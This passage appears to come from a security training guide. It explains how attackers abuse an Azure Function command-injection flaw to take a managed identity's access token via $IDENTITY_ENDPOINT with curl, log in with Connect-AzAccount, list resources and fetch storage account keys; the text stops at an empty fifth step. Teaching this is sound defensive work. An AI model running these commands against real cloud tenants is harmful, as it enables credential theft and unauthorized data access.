Attackers can potentially exploit the managed identity to authenticate with any service that allows Azure AD authentication without manually managing the login details. 

This involves leveraging a managed identity to gain unauthorized access to resources, execute malicious code, or exfiltrate sensitive data by impersonating legitimate services. 

Attackers can execute the following steps to exploit the managed identities and Azure Functions: 

▪ Step 1: Run the following command to abuse the command-injection vulnerability on the web application (Azure Function) to access $IDENTITY_ENDPOINT by obtaining the access token and client ID for Azure authentication:
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

▪ Step 2: Run the following commands to install the Azure PowerShell module and authenticate Azure using the obtained access token: 
Install-Module -Name Az -Repository PSGallery -Force Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>

▪ Step 3: Run the following command to list the resources to which the managed identity has access:
Get-AzResource

▪ Step 4: Run the following command to check whether the managed identity has permission to access the storage account keys:
Get-AzStorageAccountKey -ResourceGroupName "<resource_group>" - AccountName "<account_name>" If it has, the command returns two keys:

▪ Step 5: Now, attackers can use the obtained keys to connect to the storage account through Azure Storage Explorer:







